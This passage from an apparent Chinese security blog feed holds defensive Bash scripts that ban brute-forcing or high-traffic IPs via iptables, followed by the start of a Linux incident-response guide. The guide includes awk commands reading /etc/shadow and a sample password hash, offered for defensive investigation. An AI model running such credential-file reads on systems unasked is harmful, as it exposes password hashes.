class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置变量</span></span><br><span class="line">LOG_FILE=<span class="string">&quot;/var/log/auth.log&quot;</span></span><br><span class="line">BLOCKED_IPS_DIR=<span class="string">&quot;/var/log/blocked_ips&quot;</span></span><br><span class="line">BLOCK_THRESHOLD=4  <span class="comment"># 触发封锁的失败次数</span></span><br><span class="line">UNBAN_HOURS=24     <span class="comment"># 解封时间（小时）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 白名单IP列表 - 添加你想要豁免的IP，用空格分隔</span></span><br><span class="line">WHITELIST_IPS=<span class="string">&quot;192.168.197.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保存储封锁记录的目录存在</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$BLOCKED_IPS_DIR</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 检查并解封超过指定时间的IP</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;检查需要解封的IP...&quot;</span></span><br><span class="line"><span class="keyword">for</span> blocked_ip <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$BLOCKED_IPS_DIR</span>&quot;</span>/*; <span class="keyword">do</span></span><br><span class="line">    ip=$(<span class="built_in">basename</span> <span class="string">&quot;<span class="variable">$blocked_ip</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$blocked_ip</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        block_time=$(<span class="built_in">stat</span> -c %Y <span class="string">&quot;<span class="variable">$blocked_ip</span>&quot;</span>)</span><br><span class="line">        current_time=$(<span class="built_in">date</span> +%s)</span><br><span class="line">        time_diff=$(( (current_time - block_time) / <span class="number">3600</span> ))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$time_diff</span> -ge <span class="variable">$UNBAN_HOURS</span> ]; <span class="keyword">then</span></span><br><span class="line">            iptables -D INPUT -p tcp --dport 22 -s <span class="string">&quot;<span class="variable">$ip</span>&quot;</span> -j DROP 2&gt;/dev/null</span><br><span class="line">            <span class="built_in">rm</span> -f <span class="string">&quot;<span class="variable">$blocked_ip</span>&quot;</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;已自动解封IP: <span class="variable">$ip</span>（超过<span class="variable">$UNBAN_HOURS</span>小时无活动）&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 检测并封锁新的恶意IP</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;检测新的恶意IP...&quot;</span></span><br><span class="line">IP=$(awk <span class="string">&#x27;/Failed password/ &#123;IP[$(NF-3)]++&#125; END &#123; for (k in IP) &#123; if (IP[k]&gt;=&#x27;</span><span class="variable">$BLOCK_THRESHOLD</span><span class="string">&#x27;) print k &#125;&#125;&#x27;</span> <span class="string">&quot;<span class="variable">$LOG_FILE</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="variable">$IP</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 检查IP是否在白名单中</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$WHITELIST_IPS</span>&quot;</span> | grep -qw <span class="string">&quot;<span class="variable">$ip</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;IP <span class="variable">$ip</span> 在白名单中，跳过封锁&quot;</span></span><br><span class="line">        <span class="built_in">continue</span>  <span class="comment"># 跳过白名单IP，不执行后续封锁操作</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查IP是否已在DROP规则中</span></span><br><span class="line">    <span class="keyword">if</span> ! iptables -L INPUT -n | grep -q <span class="string">&quot;DROP.*tcp dpt:22.*<span class="variable">$ip</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        iptables -I INPUT -p tcp --dport 22 -s <span class="string">&quot;<span class="variable">$ip</span>&quot;</span> -j DROP</span><br><span class="line">        <span class="built_in">touch</span> <span class="string">&quot;<span class="variable">$BLOCKED_IPS_DIR</span>/<span class="variable">$ip</span>&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;已封锁IP: <span class="variable">$ip</span>（失败次数超过<span class="variable">$BLOCK_THRESHOLD</span>次）&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">touch</span> <span class="string">&quot;<span class="variable">$BLOCKED_IPS_DIR</span>/<span class="variable">$ip</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 确保iptables-persistent已安装</span></span><br><span class="line"><span class="keyword">if</span> ! dpkg -s iptables-persistent &amp;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;安装iptables-persistent...&quot;</span></span><br><span class="line">    apt-get update &amp;&gt;/dev/null</span><br><span class="line">    apt-get -y install iptables-persistent &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 保存规则</span></span><br><span class="line">netfilter-persistent save &amp;&gt;/dev/null</span><br><span class="line">netfilter-persistent reload &amp;&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;操作完成&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终版</p><p><img src="/2025/08/03/%E4%B8%A4%E4%B8%AA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/image-20250803221212403.png" alt="image-20250803221212403"></p><h3 id="web中间件风控脚本"><a href="#web中间件风控脚本" class="headerlink" title="web中间件风控脚本"></a>web中间件风控脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 日志文件路径</span></span><br><span class="line">logfile=/var/log/httpd/</span><br><span class="line">last_minutes=1 </span><br><span class="line"><span class="comment"># 开始时间1分钟之前（这里可以修改,如果要几分钟之内攻击次数多少次，这里可以自定义）</span></span><br><span class="line">start_time=`<span class="built_in">date</span> -d<span class="string">&quot;<span class="variable">$last_minutes</span> minutes ago&quot;</span> +<span class="string">&quot;%d/%m/%Y:%H:%M:%S&quot;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$start_time</span></span><br><span class="line"><span class="comment"># 结束时间现在</span></span><br><span class="line">stop_time=`<span class="built_in">date</span> +<span class="string">&quot;%d/%m/%Y:%H:%M:%S&quot;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$stop_time</span></span><br><span class="line">cur_date=<span class="string">&quot;`date +%d/%m/%Y`&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cur_date</span></span><br><span class="line"><span class="comment"># 过滤出单位之间内的日志并统计最高ip数，请替换为你的日志路径</span></span><br><span class="line"><span class="built_in">tac</span> <span class="variable">$logfile</span>/access.log | awk -v st=<span class="string">&quot;<span class="variable">$start_time</span>&quot;</span> -v et=<span class="string">&quot;<span class="variable">$stop_time</span>&quot;</span> <span class="string">&#x27;&#123;t=substr($4,2);if(t&gt;=st &amp;&amp; t&lt;=et)&#123;print $1&#125;&#125;&#x27;</span> |<span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr &gt; <span class="variable">$logfile</span>/log_ip_top10</span><br><span class="line"><span class="comment">#ip_top=`cat $logfile/log_ip_top10 | head -1 | awk &#x27;&#123;print $1&#125;&#x27;`</span></span><br><span class="line"><span class="comment"># 出现横杠使用sed去掉第一行</span></span><br><span class="line"><span class="comment">#sed -i &#x27;1d&#x27; $logfile/log_ip_top10    </span></span><br><span class="line"><span class="comment"># 单位时间[1分钟]内单ip访问次数超过200次的ip记录入black.txt</span></span><br><span class="line">ip=`<span class="built_in">cat</span> <span class="variable">$logfile</span>/log_ip_top10 | awk <span class="string">&#x27;&#123;if($1 &gt; 100)print $2&#125;&#x27;</span>`</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="variable">$ip</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$line</span> &gt;&gt; <span class="variable">$logfile</span>/getip.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$line</span></span><br><span class="line">iptables -I INPUT -p tcp  -m multiport --dport 80,443 -s <span class="variable">$line</span> -j DROP</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>分析</p><p>先定义了log的位置</p><p>和监控时间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start_time=`<span class="built_in">date</span> -d<span class="string">&quot;<span class="variable">$last_minutes</span> minutes ago&quot;</span> +<span class="string">&quot;%d/%m/%Y:%H:%M:%S&quot;</span>`  <span class="comment"># 起始时间（1分钟前）</span></span><br><span class="line">stop_time=`<span class="built_in">date</span> +<span class="string">&quot;%d/%m/%Y:%H:%M:%S&quot;</span>`                                <span class="comment"># 结束时间（当前时间）</span></span><br></pre></td></tr></table></figure><p>日志过滤与 IP 统计</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tac</span> <span class="variable">$logfile</span>/access.log | awk -v st=<span class="string">&quot;<span class="variable">$start_time</span>&quot;</span> -v et=<span class="string">&quot;<span class="variable">$stop_time</span>&quot;</span> <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  t=substr($4,2);  # 提取日志中的时间字段（HTTP日志第4列格式通常为 &quot;[01/Jan/2024:12:34:56&quot;，substr去掉开头的&quot;[&quot;）</span></span><br><span class="line"><span class="string">  if(t&gt;=st &amp;&amp; t&lt;=et)&#123;print $1&#125;  # 筛选时间范围内的日志，输出访问的IP地址（第1列）</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr &gt; <span class="variable">$logfile</span>/log_ip_top10</span><br></pre></td></tr></table></figure><p>作用：</p><ul><li><code>tac</code>：反向读取日志（从最新记录开始）</li><li><code>awk</code>：按时间范围筛选日志，提取符合条件的 IP</li><li><code>sort | uniq -c</code>：统计每个 IP 的访问次数</li><li><code>sort -nr</code>：按访问次数从高到低排序 </li><li>结果保存到 <code>log_ip_top10</code> 文件（前 10 名高频访问 IP）</li><li>这里也可以将前面的sort删除掉</li></ul><p>筛选需封禁的 IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=`<span class="built_in">cat</span> <span class="variable">$logfile</span>/log_ip_top10 | awk <span class="string">&#x27;&#123;if($1 &gt; 100)print $2&#125;&#x27;</span>`  <span class="comment"># 提取访问次数超过100次的IP</span></span><br></pre></td></tr></table></figure><p>作用：设定阈值设为 100 次，超过此次数的 IP 被判定为 “异常访问”。</p><p>封禁 IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="variable">$ip</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$line</span> &gt;&gt; <span class="variable">$logfile</span>/getip.txt  <span class="comment"># 将封禁的IP记录到文件</span></span><br><span class="line">  iptables -I INPUT -p tcp -m multiport --dport 80,443 -s <span class="variable">$line</span> -j DROP  <span class="comment"># 封禁IP的80（HTTP）和443（HTTPS）端口访问</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>作用：通过 iptables 规则禁止异常 IP 访问服务器的 HTTP&#x2F;HTTPS 端口。</p><p>这个脚本也没有解封的机制，我们优化一下，在设置一个白名单，直接丢ai</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置变量</span></span><br><span class="line">logfile=<span class="string">&quot;/var/log/httpd&quot;</span>                  <span class="comment"># 日志文件目录</span></span><br><span class="line">access_log=<span class="string">&quot;<span class="variable">$logfile</span>/access.log&quot;</span>          <span class="comment"># 访问日志路径</span></span><br><span class="line">blocked_ips_dir=<span class="string">&quot;/var/log/blocked_ips&quot;</span>    <span class="comment"># 存储被封锁IP记录的目录</span></span><br><span class="line">last_minutes=1                            <span class="comment"># 监控时间窗口（分钟）</span></span><br><span class="line">threshold=100                             <span class="comment"># 触发封锁的访问次数阈值</span></span><br><span class="line">unban_hours=2                             <span class="comment"># 自动解封时间（小时）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 白名单IP列表 - 添加信任的IP，用空格分隔</span></span><br><span class="line">whitelist_ips=<span class="string">&quot;192.168.197.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保必要目录存在</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="string">&quot;<span class="variable">$blocked_ips_dir</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 自动解封超过指定时间的IP</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;检查需要解封的IP...&quot;</span></span><br><span class="line"><span class="keyword">for</span> blocked_ip <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$blocked_ips_dir</span>&quot;</span>/*; <span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 提取IP地址</span></span><br><span class="line">    ip=$(<span class="built_in">basename</span> <span class="string">&quot;<span class="variable">$blocked_ip</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$blocked_ip</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="comment"># 获取封锁时间和当前时间（秒级）</span></span><br><span class="line">        block_time=$(<span class="built_in">stat</span> -c %Y <span class="string">&quot;<span class="variable">$blocked_ip</span>&quot;</span>)</span><br><span class="line">        current_time=$(<span class="built_in">date</span> +%s)</span><br><span class="line">        time_diff=$(( (current_time - block_time) / <span class="number">3600</span> ))  <span class="comment"># 转换为小时</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 超过解封时间则解除封锁</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$time_diff</span> -ge <span class="variable">$unban_hours</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="comment"># 从iptables中删除规则</span></span><br><span class="line">            iptables -D INPUT -p tcp -m multiport --dport 80,443 -s <span class="string">&quot;<span class="variable">$ip</span>&quot;</span> -j DROP 2&gt;/dev/null</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 删除记录文件</span></span><br><span class="line">            <span class="built_in">rm</span> -f <span class="string">&quot;<span class="variable">$blocked_ip</span>&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;已自动解封IP: <span class="variable">$ip</span>（超过<span class="variable">$unban_hours</span>小时无异常活动）&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 计算时间范围</span></span><br><span class="line">start_time=$(<span class="built_in">date</span> -d<span class="string">&quot;<span class="variable">$last_minutes</span> minutes ago&quot;</span> +<span class="string">&quot;%d/%m/%Y:%H:%M:%S&quot;</span>)</span><br><span class="line">stop_time=$(<span class="built_in">date</span> +<span class="string">&quot;%d/%m/%Y:%H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;监控时间范围: <span class="variable">$start_time</span> 至 <span class="variable">$stop_time</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 过滤日志并统计IP访问次数</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$access_log</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># 筛选时间范围内的IP并统计</span></span><br><span class="line">    <span class="built_in">tac</span> <span class="string">&quot;<span class="variable">$access_log</span>&quot;</span> | awk -v st=<span class="string">&quot;<span class="variable">$start_time</span>&quot;</span> -v et=<span class="string">&quot;<span class="variable">$stop_time</span>&quot;</span> <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">        t=substr($4,2);  # 提取时间字段（去掉开头的&quot;[&quot;）</span></span><br><span class="line"><span class="string">        if(t&gt;=st &amp;&amp; t&lt;=et)&#123;print $1&#125;  # 输出符合时间范围的IP</span></span><br><span class="line"><span class="string">    &#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr &gt; <span class="string">&quot;<span class="variable">$logfile</span>/log_ip_top10&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;错误: 日志文件 <span class="variable">$access_log</span> 不存在&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 处理需要封锁的IP</span></span><br><span class="line">ip_list=$(<span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$logfile</span>/log_ip_top10&quot;</span> | awk -v threshold=<span class="string">&quot;<span class="variable">$threshold</span>&quot;</span> <span class="string">&#x27;&#123;if($1 &gt; threshold)print $2&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="variable">$ip_list</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 检查是否为白名单IP</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$whitelist_ips</span>&quot;</span> | grep -qw <span class="string">&quot;<span class="variable">$ip</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;IP <span class="variable">$ip</span> 在白名单中，跳过封锁&quot;</span></span><br><span class="line">        <span class="built_in">continue</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查IP是否已被封锁</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$blocked_ips_dir</span>/<span class="variable">$ip</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="comment"># 已封锁，更新记录时间（延长封锁）</span></span><br><span class="line">        <span class="built_in">touch</span> <span class="string">&quot;<span class="variable">$blocked_ips_dir</span>/<span class="variable">$ip</span>&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;IP <span class="variable">$ip</span> 仍在高频访问，延长封锁时间&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment"># 未封锁，添加iptables规则</span></span><br><span class="line">        iptables -I INPUT -p tcp -m multiport --dport 80,443 -s <span class="string">&quot;<span class="variable">$ip</span>&quot;</span> -j DROP</span><br><span class="line">        <span class="comment"># 创建封锁记录文件</span></span><br><span class="line">        <span class="built_in">touch</span> <span class="string">&quot;<span class="variable">$blocked_ips_dir</span>/<span class="variable">$ip</span>&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;已封锁IP: <span class="variable">$ip</span>（<span class="variable">$last_minutes</span>分钟内访问超过<span class="variable">$threshold</span>次）&quot;</span></span><br><span class="line">        <span class="comment"># 记录到日志</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(date +<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span> - 封锁IP: <span class="variable">$ip</span>&quot;</span> &gt;&gt; <span class="string">&quot;<span class="variable">$logfile</span>/blocked_log.txt&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;操作完成&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一样加入计划任务就行了</p><p><code>logfile</code>   <code>access_log</code>需要根据我们中间件的位置进行更换</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;自动封禁多次尝试暴力破解-SSH-密码的-IP-地址&quot;&gt;&lt;a href=&quot;#自动封禁多次尝试暴力破解-SSH-密码的-IP-地址&quot; class=&quot;headerlink&quot; title=&quot;自动封禁多次尝试暴力破解 SSH 密码的 IP 地址&quot;&gt;&lt;/a&gt;自动封禁多次尝试暴力破解 SSH 密码的 IP 地址&lt;/h3&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://heisha123.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="应急响应" scheme="https://heisha123.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>应急响应-Linux篇</title>
    <link href="https://heisha123.github.io/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/"/>
    <id>https://heisha123.github.io/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/</id>
    <published>2025-08-03T08:42:13.000Z</published>
    <updated>2025-08-03T14:26:08.469Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Linux-入侵排查"><a href="#Linux-入侵排查" class="headerlink" title="Linux 入侵排查"></a>Linux 入侵排查</h3><span id="more"></span><h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Linux 服务器入侵排查的思路。</p><h4 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h4><h5 id="1-1-账号安全"><a href="#1-1-账号安全" class="headerlink" title="1.1 账号安全"></a>1.1 账号安全</h5><p><strong>基本使用：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、用户信息文件 /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后的 shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line">2、影子文件 /etc/shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br><span class="line"></span><br><span class="line">这里重点看有密码的也就是后面又hash值的，没有密码不能进行远程连接</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">who     查看当前登录用户（tty 本地登陆  pts 远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime  查看登陆多久、多少用户，负载状态</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line">这条awk命令的作用是从/etc/shadow文件中筛选出使用$1$（MD5 加密）或$6$（SHA-512 加密）算法存储密码的用户，并打印这些用户的用户名，也就是有hash密码的</span><br><span class="line">root@ubuntu:~# awk -F: &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow      #只会打印账号</span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class="line">  先用more 读取 /etc/sudoers 然后通过第一个管道符 grep -v 进行反向匹配，也就是不包含 #开头 和空行，然   后在通过管道符 匹配权限ALL=(ALL)</span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class="line">userdel user       删除 user 用户</span><br><span class="line">userdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除</span><br></pre></td></tr></table></figure><h5 id="1-2-历史命令"><a href="#1-2-历史命令" class="headerlink" title="1.2 历史命令"></a>1.2 历史命令</h5><p><strong>基本使用：</strong></p><p>通过 .bash_history 文件查看帐号执行过的系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 